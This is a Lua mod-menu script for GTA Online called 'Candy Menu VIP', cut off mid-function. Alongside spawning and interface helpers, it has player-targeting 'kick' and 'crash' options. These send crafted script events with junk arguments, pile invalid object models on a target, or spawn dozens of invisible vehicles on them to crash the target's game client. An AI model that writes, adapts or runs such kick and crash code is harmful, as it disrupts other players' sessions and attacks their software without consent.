resources_dir = filesystem.resources_dir() .. '/Candy/'
util.require_natives("1651208000")
util.keep_running()
util.require_no_lag('natives-1640181023')
require "lib.Candy"
local mlist = menu.list
local divider = menu.divider
local action = menu.action
local toggle = menu.toggle
local toggleloop = menu.toggle_loop
local mroot = menu.my_root
local proot = menu.player_root
local text = menu.text_input
local link = menu.hyperlink
local getvalue = menu.get_value
local refbypass = menu.ref_by_path
local agroup = "missfbi3ig_0"
local anim = "shit_loop_trev"
local mshit = util.joaat("prop_big_shit_02")
local agroup2 = "switch@trevor@jerking_off"
local anim2 = "trev_jerking_off_loop"
local cum = util.joaat("p_oil_slick_01")
local cage = util.joaat("prop_gold_cont_01")
local door = util.joaat("v_ilev_ph_cellgate")
local inmate = util.joaat("s_m_y_prisoner_01")
local exp = ("EXP_TAG_RCTANK_ROCKET")
local chop = util.joaat("a_c_chop")
local oldchop = util.joaat("a_c_chop_02")
local WhiteMonke = util.joaat("A_C_Rhesus")
local BlackMonke = util.joaat("A_C_Chimp")
local shark = util.joaat("a_c_sharktiger")
local shark2 = util.joaat("a_c_sharkhammer")
local whale = util.joaat("a_c_humpback")
local cop01 = util.joaat("s_m_y_cop_01")
local acpig = util.joaat("a_c_pig")
------------------------
local ufo = util.joaat("sum_prop_dufocore_01a")
local dufo = util.joaat("imp_prop_ship_01a")
local ramp = util.joaat("stt_prop_ramp_jump_l")
local wall = util.joaat("prop_tyre_wall_02")
local targets = entities.get_all_peds_as_pointers()
local alien = util.joaat("vw_prop_vw_colle_alien")
local beast = util.joaat("vw_prop_vw_colle_beast")
local impotent_rage = util.joaat("vw_prop_vw_colle_imporage")
local pogo = util.joaat("vw_prop_vw_colle_pogo")
local princess_robot = util.joaat("vw_prop_vw_colle_prbubble")
local space_ranger = util.joaat("vw_prop_vw_colle_rsrcomm")
local space_ranger_2 = util.joaat("vw_prop_vw_colle_rsrgeneric")
local bigfoot = util.joaat("vw_prop_vw_colle_sasquatch")
local pickup = util.joaat("pickup_portable_crate_unfixed_incar_with_passengers")
local healthpickup = util.joaat("PICKUP_HEALTH_STANDARD")
local health = util.joaat("prop_ld_health_pack")
local armorpickup = util.joaat("PICKUP_ARMOUR_STANDARD")
local armor = util.joaat("Prop_Armour_Pickup")
local parachutepickup = util.joaat("PICKUP_PARACHUTE")
----------------------------
local parachute = util.joaat("p_parachute_s_shop")
local vehiclepickup = util.joaat("PICKUP_VEHICLE_HEALTH_STANDARD")
local vehicledrop = util.joaat("Prop_MP_REPAIR")
local pqspickup = util.joaat("PICKUP_HEALTH_SNACK")
local pqs = util.joaat("PROP_CHOC_PQ")
local card = util.joaat("vw_prop_vw_lux_card_01a")
local num = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35"
}
local monkedude = util.joaat("u_m_y_pogo_01")
local nakeddude = util.joaat("a_m_m_acult_01")
local headless = util.joaat("ig_johnnyklebitz")
local clown = util.joaat("s_m_y_clown_01")
local juggernaut = util.joaat("u_m_y_juggernaut_01")
local zombie = util.joaat("u_m_y_zombie_01")
local stripper = util.joaat("csb_stripper_02")
local corpseless = util.joaat("mp_m_marston_01")
local mime = util.joaat("s_m_y_mime")
local jesus = util.joaat("u_m_m_jesus_01")
local microsmg = util.joaat("weapon_MicroSMG")
local shotgun = util.joaat("weapon_PumpShotgun")
local sniper = util.joaat("weapon_SniperRifle")
local machete = util.joaat("weapon_Machete")
local RPG = util.joaat("weapon_RPG")
local stungun = util.joaat("weapon_stungun_mp")
local pistol = util.joaat("weapon_Pistol")
local railgun = util.joaat("weapon_Railgun")
local minigun = util.joaat("weapon_Minigun")
local atomizer = util.joaat("weapon_raypistol")
local hellbringer = util.joaat("weapon_raycarbine")
local fireextinguisher = util.joaat("weapon_fireextinguisher")
local unarmed = util.joaat("weapon_unarmed")
local playersinvehicle = {}
local playersonfoot = {}
local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
local bigasscircle = util.joaat("ar_prop_ar_neon_gate4x_04a")
local c1
local c2
local c3
local c4
local c5
local c6
local c7
local c8
local c9
local c10
local c12
local c13
local c14
local c15
local c16
local c17
local c18
local c19
local wallbr = util.joaat("bkr_prop_biker_bblock_mdm3")
local expcar = util.joaat("Tezeract")
local heavy = util.joaat("weapon_heavysniper")
local molotov = util.joaat("weapon_molotov")
local copmodel = util.joaat("s_m_y_cop_01")

function on_stp()
	util.show_corner_help("~r~下次见! ~s~ ‹ ~o~ " .. SCRIPT_FILENAME)
end
local notification = b_notifications.new()

notification.notify("Welcome to Candy Menu","Original author of this menu: CandyCub")


cTime = util.current_time_millis

local function SETUP_SINGLE_LINE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SETUP_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(70.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(125.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("left")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end

local function ADD_TEXT_TO_SINGLE_LINE(scaleform, text, font, colour)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "ADD_TEXT_TO_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end

local function HIDE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "HIDE")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("presents")
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.16)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end


function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end

local overlay_x = 0.0052
local overlay_y = 0.18519
local run = true
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0


if SCRIPT_MANUAL_START then
	gShowingIntro = true
	local state = 0
	local sTime = cTime()

util.create_tick_handler(function()	
		local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")	
		while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
			util.yield()
		end
		
		HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
		if state == 0 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "Welcome ", "$font5", "HUD_COLOUR_PINK")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_PINK")

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			state = 1
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 1 then
			HIDE(scaleform)
			state = 2
			sTime = cTime()
		end

		if cTime() - sTime >= 3500 and state == 2 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, ' Candy Menu VIP ', "$font5", "HUD_COLOUR_RED")
			
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

			state = 3
			sTime = cTime()
		end

		if cTime() - sTime >= 4000 and state == 3 then
			HIDE(scaleform)
			state = 4
			sTime = cTime()
		end
		if cTime() - sTime >= 3000 and state == 4 then
			gShowingIntro = false
			return false
		end

		GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
		return true
	end)
end

local scaleform = require("Candy")
local sf = scaleform("instructional_buttons")
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local stop_on_exit = true
local speed = 6
local vehflyt

local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}



function show_custom_alert_until_enter(l1)
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        -- line here
        native_invoker.push_arg_string(l1)
        -- optional second line here
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        util.yield()
    end
end

function log(content)
    if verbose then
        util.log("[CandySCRIPT] " .. content)
    end
end

function do_label_preset(label, text)
    log("Setting up label present for label " .. label .. " with text " .. text)
    menu.trigger_commands("addlabel " .. label)
    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
    menu.trigger_commands(prep)
end

function notification(message, color)
	HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)

	local picture = "CHAR_SOCIAL_CLUB"
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)

	title = "Candy Script"
	if color == colors.red or color == colors.red then
		subtitle = "~u~Notification"
	elseif color == colors.black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 4, title, subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

cages = {}
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end

function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end
local function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end

local function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

local function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end

function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

local function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

local function log(content)
    if verbose then
        util.log("[SPOONER] " .. content)
    end
end

local function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end

local function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_preprocess_car(vehicle, data)
    log("Preprocessing vehicle " .. vehicle)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end

    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE._SET_VEHICLE_INTERIOR_COLOR(vehicle, colors['LrInterior'])
    VEHICLE._SET_VEHICLE_DASHBOARD_COLOR(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))

    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)
    -- not sure how to set lights on
    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
    log("Preprocessing complete for vehicle " .. vehicle)
end

if SCRIPT_MANUAL_START then

do_label_preset("HUD_JOINING", "正在使用Candy加入GTA在线模式")
do_label_preset("MP_SPINLOADING", "Isn't Candy Script the best?")
menu.trigger_commands("luacandymenuvip")
end


function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


	local Languages = {
	
	{ Name = "简中", Key = "zh-CN" },

}

local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end




KickScriptEvent = {
1674887089,
608596116,
1781594056,
-442434037
    }

function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

util.keep_running()



GenerateFeatures = function(PlayerID)
    menu.divider(menu.player_root(PlayerID), "Candy Menu VIP")
	
    PlayerMainMenu = menu.list(menu.player_root(PlayerID), "移除选项", {}, "", function(); end)
	
    KickMenu = menu.list(PlayerMainMenu, "踢出选项", {}, "", function(); end)
	
	menu.action(KickMenu,"脚本踢出", {},"", function()
		util.trigger_script_event(1 << PlayerID,{1674887089, pid})
		util.trigger_script_event(1 << PlayerID,{608596116, pid})
		for i, v in ipairs(KickScriptEvent) do
            par1 = math.random(-2147483647, 2147483647)
            util.trigger_script_event(1 << PlayerID, {v, PlayerID, par1,par1,par1,par1,par1,par1,par1,par1})
            util.yield(10)
        end
		util.toast("Done :)")
	end)
	
    CrashMenu = menu.list(PlayerMainMenu, "崩溃选项", {}, "", function(); end)

    menu.action(CrashMenu, "脚本事件崩溃", {}, "", function()
        util.trigger_script_event(1 << PlayerID, { -555356783, PlayerID ,85952,99999,52682274855,526822745 })
        util.trigger_script_event(1 << PlayerID, { 526822748, PlayerID ,78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << PlayerID, { -66669983, PlayerID ,526822748,555555, math.random(80521,2959749521) })
        util.trigger_script_event(1 << PlayerID, { -1733737974, PlayerID ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
        util.trigger_script_event(1 << PlayerID, { -1529596656, PlayerID ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
        util.trigger_script_event(1 << PlayerID, { -8965204809, PlayerID ,795221,59486,48512151,-9545440 })
    end)

    menu.action(CrashMenu, "无效物体崩溃", {}, "", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(0x7367D224, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        local Object_pizza5 = CreateObject(0xFBF7D21F, TargetPlayerPos)
        local Object_pizza6 = CreateObject(3613262246, TargetPlayerPos)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        entities.delete_by_handle(Object_pizza5)
        entities.delete_by_handle(Object_pizza6)
    end)
	
		menu.click_slider(CrashMenu, "导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
	if on_change == 1 then	
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedVehicleList = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")

	end	
    if on_change == 2 then
	    menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        TargetPlayerPos.y = TargetPlayerPos.y + 1050
		SpawnedVehicleList1 = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
